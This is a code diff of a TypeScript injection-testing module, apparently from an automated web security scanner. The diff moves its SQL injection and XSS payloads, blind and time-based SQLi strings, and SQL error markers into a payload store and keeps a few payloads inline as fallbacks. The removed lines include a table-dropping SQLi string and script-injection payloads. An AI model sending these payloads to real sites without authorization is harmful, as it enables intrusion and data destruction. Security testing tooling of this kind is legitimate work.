@@ -14,25 +14,7 @@ import type { TechniquePrimitive, TechniqueContext, AttackStep, StepExecutionRes
 import { claimFor } from './framework'
 import { EvidenceGate } from '../intelligence/evidence-gate'
 import { observeParse, observeWaf, observeEndpoints, observeCompare } from './observers'
-
-const SQLI_PAYLOADS = [
-  "'",
-  "' OR '1'='1",
-  "1' ORDER BY 10-- -",
-  "') OR ('1'='1",
-  "1; DROP TABLE users-- -",
-  "1 AND 1=CONVERT(int,@@version)-- -",
-]
-const XSS_PAYLOADS = [
-  '<script>alert(1)</script>',
-  '"><img src=x onerror=alert(1)>',
-  '${alert(1)}',
-  '<svg/onload=alert(1)>',
-]
-// Blind (boolean) differential + time-based — finds SQLi when no error leaks.
-const SQLI_BLIND_TRUE = "' AND '1'='1"
-const SQLI_BLIND_FALSE = "' AND '1'='2"
-const SQLI_TIME = "1' AND SLEEP(5)-- -"
+import { getPayloadStore } from '../payloads/store'
 
 // WAF-bypass encodings: a server that decodes the payload will reflect the real
 // SQLi/XSS, bypassing a naive WAF that only inspects the raw (encoded) bytes.
@@ -54,11 +36,7 @@ function multipartBody(param: string, value: string): string {
   return `--${boundary}\r\nContent-Disposition: form-data; name="${param}"\r\n\r\n${value}\r\n--${boundary}--\r\n`
 }
 const MULTIPART_CT = 'multipart/form-data; boundary=----ultimatrix'
-const SQLI_ERROR_MARKERS = [
-  'sql syntax', 'mysql', 'postgresql', 'sqlite', 'sqlstate', 'ora-', 'odbc',
-  'syntax error', 'unclosed quotation', 'quoted string', 'you have an error',
-  'pg_query', 'unknown column', 'ambiguous column', 'supplied argument',
-]
+const SQLI_ERROR_MARKERS = () => getPayloadStore().getMarkers('sqli/error-based')
 
 function urlWithParam(url: string, param: string, value: string): string {
   try {
@@ -86,7 +64,9 @@ export const classicInjection: TechniquePrimitive = {
     const param = ctx.param ?? ctx.endpoint?.params?.[0]?.name ?? 'q'
 
     const steps: AttackStep[] = []
-    SQLI_PAYLOADS.forEach((p, i) => {
+    const sqliPayloads = ctx.payloadSet ?? getPayloadStore().getPayloads('sqli/error-based')
+    const xssPayloads = getPayloadStore().getPayloads('xss/reflected')
+    sqliPayloads.forEach((p, i) => {
       const stepUrl = urlWithParam(url, param, p)
       const body = method !== 'GET' ? JSON.stringify({ [param]: p }) : undefined
       steps.push({
@@ -97,7 +77,7 @@ export const classicInjection: TechniquePrimitive = {
         metadata: { kind: 'sqli', param, payload: p },
       })
     })
-    XSS_PAYLOADS.forEach((p, i) => {
+    xssPayloads.forEach((p, i) => {
       const stepUrl = urlWithParam(url, param, p)
       const body = method !== 'GET' ? JSON.stringify({ [param]: p }) : undefined
       steps.push({
@@ -108,8 +88,10 @@ export const classicInjection: TechniquePrimitive = {
         metadata: { kind: 'xss', param, payload: p },
       })
     })
-    // Blind boolean differential: a true variant that behaves differently from a
-    // false variant is a strong SQLi signal even with no DB error in the body.
+    const blindPayloads = getPayloadStore().getPayloads('sqli/boolean-blind')
+    const SQLI_BLIND_TRUE = blindPayloads[0] ?? "' AND '1'='1"
+    const SQLI_BLIND_FALSE = blindPayloads[1] ?? "' AND '1'='2"
+    const SQLI_TIME = (getPayloadStore().getPayloads('sqli/time-based'))[0] ?? "1' AND SLEEP(5)-- -"
     const blindUrlTrue = urlWithParam(url, param, SQLI_BLIND_TRUE)
     const blindUrlFalse = urlWithParam(url, param, SQLI_BLIND_FALSE)
     const blindBodyTrue = method !== 'GET' ? JSON.stringify({ [param]: SQLI_BLIND_TRUE }) : undefined
@@ -190,8 +172,9 @@ export const classicInjection: TechniquePrimitive = {
 
       if (kind === 'sqli') {
         const parsed = await observeParse(body, r.headers ?? {}, r.status ?? 0)
-        const leaked = SQLI_ERROR_MARKERS.some(m => lower.includes(m)) ||
-          parsed.textSnippets.some(s => SQLI_ERROR_MARKERS.some(m => s.toLowerCase().includes(m)))
+        const markers = SQLI_ERROR_MARKERS()
+        const leaked = markers.some(m => lower.includes(m)) ||
+          parsed.textSnippets.some(s => markers.some(m => s.toLowerCase().includes(m)))
         if (leaked && (r.status ?? 500) < 500) {
           sqliHit = true
           evidence.push({ kind: 'response', label: `SQLi error leaked [${r.step.metadata?.param}] ${r.step.request.method} ${r.step.request.url} → ${r.status}`, data: body.slice(0, 1500) })
